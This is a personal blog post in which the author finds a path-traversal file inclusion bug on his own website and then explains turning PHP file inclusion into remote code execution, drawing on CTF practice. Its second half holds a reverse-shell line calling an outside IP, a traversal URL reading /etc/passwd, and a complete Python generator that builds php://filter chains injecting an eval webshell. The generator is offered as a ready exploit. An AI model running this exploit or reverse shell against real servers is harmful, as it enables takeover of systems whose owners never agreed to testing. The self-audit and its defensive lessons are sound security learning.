---
title: How I hacked my own website
date: 2023-12-22
description: Local file inclusion vulnerability and local file inclusion to remote code execution
---

<style type="text/css">
td {
    padding:0 15px;
}

.force-word-wrap pre code {
  white-space : pre-wrap !important;
}
</style>

<p style="text-align:center;">
    <img src="/developerpropeller.jpg" width="300" class="center">
</p>

<h2 class="border-bottom mb-3 mt-5">Content in this Blog Post</h2>

In this blog post I will discuss the following points

1. Local file inclusion, how I hacked my own website
2. An insane local file inclusion to remote code execution vulnerability

Recently, I have been learning about penetration testing (hacking), and the most enjoyable aspect of this process is doing Capture The Flags (CTFs). This involves breaking into a vulnerable machine and escalating privileges to take ownership of the machine. In a recent CTF challenge, I learned about local file inclusion, and at some point, I realized that my own website was also susceptible to it. Big oops.


<h2 class="border-bottom mb-3 mt-5">What is LFI and how I hacked myself</h2>

So what is local file inclusion (LFI)? LFI is where files on the server that are not meant to be viewed are exposed to a visitor of the web page. These files can contain very sensitive information such as usernames and passwords, ssh keys, or other sensitive information that you don't want leaked out. 

When does LFI happen? LFI happens when user input from a url is used to retrieve a file on the server that will be displayed.

Consider the following example: Let's say we have the following URL, https://vulnerablewebsite.com/showpage.php?page=article1, which is designed to display "article1" on the screen. In this context, local file inclusion (LFI) occurs if: 

* `showpage.php` uses the value of the page parameter to read a file from the file system to be displayed
* The value of the page parameter is not validate or sanitized

An attacker could manipulate the "page" parameter to include local files. For instance, an attacker might try accessing sensitive files with a payload like `https://vulnerablewebsite.com/showpage.php?page=/path/to/database/configuration/that/contains/a/password` (this was the crux of the CTF I was doing). I read that mostly php sites are vulnerable to this kind of attack, but that its not exclusive to php, and then it dawned on me. Although I use Nodejs for this website I do exactly the same thing. I grab a value from the url look up a markdown file corresponding to that value on the file system, I transform the markdown file into an html page an serve it to the user. 

So I tried manipulating my own URL as follows: `http://niekdeschipper.com/projects/../../../../../../etc/passwd`. The `../../../../` part traverses back to the root of the file system, and `/etc/passwd` is the path to a fairly common file that almost always exists. It shows which users are present on the server, and at some point in history, it contained passwords. This did not work, but after applying url encoding, I got the following:


<p style="text-align:center;">
    <img src="/hacked.png" width="800" class="center">
</p>

Oh no! This was a very funny moment. I never realized this would be a possibility when I designed my own janky web server. I knew the phrase "never trust user input," but did not realize that the URL is also user input. In my case, it wasn't that bad. Although visitors to my site had access to the whole file system all this time, there was no sensitive information on the server because I run the web server in a container on Kubernetes. If I ran it on a virtual machine, or, God forbid, my own personal machine, it would have been a completely different story. Everyone would have had access to all kinds of access keys.

So, what lessons can you learn from this?

* Don't use unsanitized input from the URL to retrieve and display files from the file system. You could sanitize the input by making path traversal impossible, or even better, only allow whitelisted user input.
* Prevent needing user input altogether. Why did I even use the URL path to retrieve files anyway? The answer: because I was lazy. Now, I generate my HTML files beforehand (not upon request), like other static site generators.
* Don't create your own static website generator. Although I am happy with it, if I would have known better, I would have picked an existing technology.


<h2 class="border-bottom mb-3 mt-5">Local file inclusion to remote code execution</h2>

Another CTF had me exploit LFI to remote code execution, which seemed insane to me at first. How would you get remote code execution from only local file inclusion?
Well, in comes the php wrapper filter module. If this module is enabled and if LFI is possible on the server by means of the `include()` function, you are in!

You can abuse the php filter module to add characters to the file to be included in an `include()` function. Everything that ends up in the `include()` statement gets executed on the server, so you can add code before the file, that retrieves a reverse shell from the url and executes it (for example: `exec('bash -i > /dev/tcp/10.10.10.10/4444 0>&1');`).


I crafted the following URL exploit generator from various sources on the internet (the ones I found did not end up working for me), it has been very useful for CTFs thus far (I don't expect it to be very relevant these days anymore in reality). But if you encounter a php web server vulnerable to LFI, chances are the might be also vulnerable to this. Below you can find the script, it is meant to be quite readable:

```python
# Local file inclusion (LFI) to RCE (Remote code execution) Exploit
#
# This script generates a url containing a command to be executed on the target
# The script works if LFI is possible on a server running php, in combination with the php filter wrapper
#
# It is based on a bunch of similar scripts, that did not do the trick for me,
# so I created a new one. It has been very helpful in more CTF's than I anticipated.
#
# For information see:
# See: https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters
#
# Usage:
# Set the variables
# python3 ./exploit.py


################################################################################################3
# CHANGE ME

url = "http://target-ip/script.php?page="  # url to the vulnerable path
file_to_use = "../../../../../etc/passwd/" # a file vulnerable to LFI
command = "phpinfo();" # This command gets executed on the target, use your own command here and url encode it


################################################################################################3
import base64

# The code in the variable "payload" is the code that executes the command on the target
# The payload gets inserted using the php filter before included file
# and gets included together with the "file_to_use".
# The payload works by reading the command from the from url and passing it to eval.
# You could also directly put the command in the payload, but that will result in an extermely long
# url that will most likely be rejected by the server.

payload = "<?= $a =$_GET['0'];eval($a);?>"
payload = payload.encode('utf-8')
base64_payload = base64.b64encode(payload).decode('utf-8').replace("=", "")

conversions = {
    '0': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2',
    '1': 'convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4',
    '2': 'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921',
    '3': 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE',
    '4': 'convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE',
    '5': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2',
    '6': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.CSIBM943.UCS4|convert.iconv.IBM866.UCS-2',
    '7': 'convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4',
    '8': 'convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2',
    '9': 'convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB',
    'A': 'convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213',
    'a': 'convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE',
    'B': 'convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000',
    'b': 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE',
    'C': 'convert.iconv.UTF8.CSISO2022KR',
    'c': 'convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2',
    'D': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213',
    'd': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5',
    'E': 'convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT',
    'e': 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937',
    'F': 'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB',
    'f': 'convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213',
    'g': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8',
    'G': 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90',
    'H': 'convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213',
    'h': 'convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE',
    'I': 'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213',
    'i': 'convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000',
    'J': 'convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4',
    'j': 'convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16',
    'K': 'convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE',
    'k': 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2',
    'L': 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC',
    'l': 'convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE',
    'M':'convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T',
    'm':'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949',
    'N': 'convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4',
    'n': 'convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61',
    'O': 'convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775',
    'o': 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE',
    'P': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB',
    'p': 'convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4',
    'q': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.GBK.CP932|convert.iconv.BIG5.UCS2',
    'Q': 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2',
    'R': 'convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4',
    'r': 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.ISO-IR-99.UCS-2BE|convert.iconv.L4.OSF00010101',
    'S': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS',
    's': 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90',
    'T': 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103',
    't': 'convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS',
    'U': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943',
    'u': 'convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61',
    'V': 'convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB',
    'v': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.ISO-8859-14.UCS2',
    'W': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936',
    'w': 'convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE',
    'X': 'convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932',
    'x': 'convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS',
    'Y': 'convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361',
    'y': 'convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT',
    'Z': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16',
    'z': 'convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937',
    '/': 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4',
    '+': 'convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157',
    '=': ''
}

# generate some garbage base64
filters = "convert.iconv.UTF8.CSISO2022KR|"
filters += "convert.base64-encode|"
# make sure to get rid of any equal signs in both the string we just generated and the rest of the file
filters += "convert.iconv.UTF8.UTF7|"


for c in base64_payload[::-1]:
        filters += conversions[c] + "|"
        # decode and reencode to get rid of everything that isn't valid base64
        filters += "convert.base64-decode|"
        filters += "convert.base64-encode|"
        # get rid of equal signs
        filters += "convert.iconv.UTF8.UTF7|"

filters += "convert.base64-decode"

final_payload = f"php://filter/{filters}/resource={file_to_use}"

print(f"{url}{final_payload}&0={command}")
```
